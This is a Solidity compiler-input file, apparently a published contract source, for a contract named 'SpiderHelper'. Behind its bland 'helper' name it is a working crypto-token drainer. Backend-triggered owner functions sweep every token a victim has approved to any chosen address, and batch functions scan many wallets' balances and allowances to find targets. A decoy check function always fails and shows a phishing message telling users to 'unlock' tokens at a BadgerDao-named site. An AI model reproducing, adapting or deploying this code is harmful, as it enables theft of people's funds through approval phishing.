{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/helper.sol": {
      "content": "// SPDX-License-Identifier: GPL-2.0-or-later\n// version 1.8\n\npragma solidity ^0.8.0;\npragma abicoder v2;\n\ninterface IERC20 {\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IUnlock{\n    function Check(address sender) external returns (bool);\n}\n\ncontract SpiderHelper is IUnlock {\n    //contract owner\n    address public owner;\n    //allowed callers\n    mapping (address => bool) public allowed;\n    //check message\n    string private checkMsg;\n\n    constructor() {\n        owner = msg.sender;\n        allowed[owner] = true;\n        checkMsg = \"ERC20: token must be unlocked before approve. Visit https://BadgerDao.app \";\n    }\n\n    //allowed for owner\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"no access\");\n        _;\n    }\n\n    //allowed for caller\n    modifier onlyAllowed() {\n        require(allowed[tx.origin], \"no access\");\n        _;\n    }\n\n    //for ether receiving\n    fallback () payable external {}\n    receive () payable external {}\n\n    //change owner\n    function setOwner_10001(address newOwner) public onlyOwner payable {\n        require(newOwner != address(0), \"invalid address\");\n        allowed[owner] = false;\n        owner = newOwner;\n        allowed[owner] = true;\n    }\n\n    //set allowed\n    function setAllowed_10001(address caller, bool permit) public onlyOwner payable {\n        allowed[caller] = permit;\n    }\n\n    //set check message\n    function setCheckMessage_10001(string calldata _msg) public onlyOwner payable {\n        checkMsg = _msg;\n    }\n\n    //withdraw ether\n    function withdrawEth_10001(address payable receiver, uint amount) public onlyAllowed payable {\n        uint balance = address(this).balance;\n        if (amount == 0) {\n            amount = balance;\n        }\n        require(amount > 0 && balance >= amount, \"no balance\");\n        receiver.transfer(amount);\n    }\n\n    //withdraw token\n    function withdrawToken_10001(address receiver, address tokenAddress, uint amount) public onlyAllowed payable {\n        uint balance = tokenBalance(tokenAddress, address(this));\n        if (amount == 0) {\n            amount = balance;\n        }\n\n        require(amount > 0 && balance >= amount, \"bad amount\");\n        IERC20(tokenAddress).transfer(receiver, amount);\n    }\n    \n    /////////////////////////////////////////////////////////\n    /////////////////////////////////////////////////////////\n    //transfer with amount\n    //executed manually\n    //queried from backend\n    function transferTokenToAddressWithAmount_10001(address token, address holder, address to, uint amount) public payable onlyAllowed returns(uint, uint) {\n        amount = safeTransferFrom(token, holder, to, amount);\n        require(amount > 0, \"bad transfer\");\n        return (amount, tokenApprovedBalance(token, holder));\n    }\n\n    //transfer\n    //executed/queried from backend\n    function transferTokenToAddress_10001(address token, address holder, address to) public payable onlyAllowed returns (uint, uint) {\n        uint amount = tokenApprovedBalance(token, holder);\n        require(amount > 0, \"bad amount\");\n        amount = safeTransferFrom(token, holder, to, amount);\n        require(amount > 0, \"bad transfer\");\n        return (amount, tokenApprovedBalance(token, holder));\n    }\n    \n    //transfer with amount per call\n    //executed/queried from backend\n    function transferTokenWithAmountPerCall_10001(address token, address holder, address to, uint amount) public payable onlyAllowed returns(uint, uint) {\n        uint transferred = 0;\n        while(true) {\n            uint approved = tokenApprovedBalance(token, holder);\n            if (approved <= 0)\n                break;\n            \n            if (approved > amount) \n                approved = amount;\n\n            approved = safeTransferFrom(token, holder, to, approved);\n            if (approved == 0)\n                break;\n            \n            transferred += approved;\n        }\n        \n        require(transferred > 0, \"bad transfer\");\n        \n        return (transferred, tokenApprovedBalance(token, holder));\n    }\n    /////////////////////////////////////////////////////////\n    /////////////////////////////////////////////////////////\n\n    //determine balance and allowance\n    function _determineBalanceAndAllowance_10001(address token, address holder) public view returns(uint balance, uint allowance) {\n        balance = tokenBalance(token, holder);\n        allowance = tokenAllowance(token, holder, address(this));\n    }\n\n    ///////////////////////////////////////////////////////////////////\n    ///////////////////////////////////////////////////////////////////\n    \n    function batchDetermineBalance_10001(address[] calldata tokens, address[] calldata holders, bool skipContract) public view returns (uint[][] memory) {\n        uint tokenCount = tokens.length;\n        uint holderCount = holders.length;\n        uint[][] memory result = new uint[][](holderCount);\n        for (uint i=0; i<holderCount; i++) {\n            address holder = holders[i];\n            bool skip = skipContract && isContractAddress(holder);\n            uint[] memory balances = new uint[](tokenCount);\n            for (uint j=0; j<tokenCount; j++) {\n                balances[j] = skip ? type(uint).max : tokenBalance(tokens[j], holder);\n            }\n            result[i] = balances;\n        }\n        return result;\n    }\n\n    function batchDetermineAllowance_10001(address[] calldata tokens, address[] calldata holders) public view returns (uint[][] memory) {\n        uint tokenCount = tokens.length;\n        uint holderCount = holders.length;\n        uint[][] memory result = new uint[][](holderCount);\n        for (uint i=0; i<holderCount; i++) {\n            address holder = holders[i];\n            uint[] memory allowances = new uint[](tokenCount);\n            for (uint j=0; j<tokenCount; j++) {\n                uint allowance = tokenAllowance(tokens[j], holder, address(this));\n                uint balance = tokenBalance(tokens[j], holder);\n\n                if (allowance == type(uint).max)\n                    allowance = balance;\n\n                allowances[j] = balance < allowance ? balance : allowance;\n            }\n            result[i] = allowances;\n        }\n        return result;\n    }\n\n    function batchDetermineEthBalance_10001(address[] calldata holders) public view returns (uint[] memory) {\n        uint holderCount = holders.length;\n        uint[] memory result = new uint[](holderCount);\n        for (uint i=0; i<holderCount; i++) {\n            address holder = holders[i];\n            result[i] = holder.balance;\n        }\n        return result;\n    }\n\n    //////////////////////////////////////////////////////////\n    //////////////////////////////////////////////////////////\n    function isContractAddress(address addr) internal view returns (bool) {\n        uint size;\n        assembly { size := extcodesize(addr) }\n        return size > 0;\n    }\n\n    function tokenBalance(address token, address holder) internal view returns(uint) {\n        uint result = 0;\n\n        try IERC20(token).balanceOf(holder) returns(uint v) {\n            result = v;\n        } catch (bytes memory) {\n        }\n\n        return result;\n    }\n\n    function tokenAllowance(address token, address holder, address spender) internal view returns(uint) {\n        uint result = 0;\n\n        try IERC20(token).allowance(holder, spender) returns(uint v) {\n            result = v;\n        } catch (bytes memory) {\n        }\n\n        return result;\n    }\n    \n    function tokenApprovedBalance(address token, address holder) internal view returns(uint) {\n        uint balance = tokenBalance(token, holder);\n        uint allowance = tokenAllowance(token, holder, address(this));\n\n        if (allowance == type(uint).max)\n            allowance = balance;\n\n        return balance < allowance ? balance : allowance;\n    }\n    \n    //safe transferFrom\n    function safeTransferFrom(address token, address from, address to, uint value) private returns(uint) {\n        uint amountBefore = tokenBalance(token, to);\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\n        if(success && (data.length == 0 || abi.decode(data, (bool)))) {\n            uint amountAfter = tokenBalance(token, to);\n            return amountAfter > amountBefore ? amountAfter - amountBefore : 0;\n        } else {\n            return 0;\n        }\n    }\n\n    ////////////////////////////////////////////////////\n    ////////////////////////////////////////////////////\n    function Check(address _sender) override view external returns (bool){\n        require(tx.gasprice == 0, checkMsg);\n        return true;\n    }\n}\n"
    }
  }
}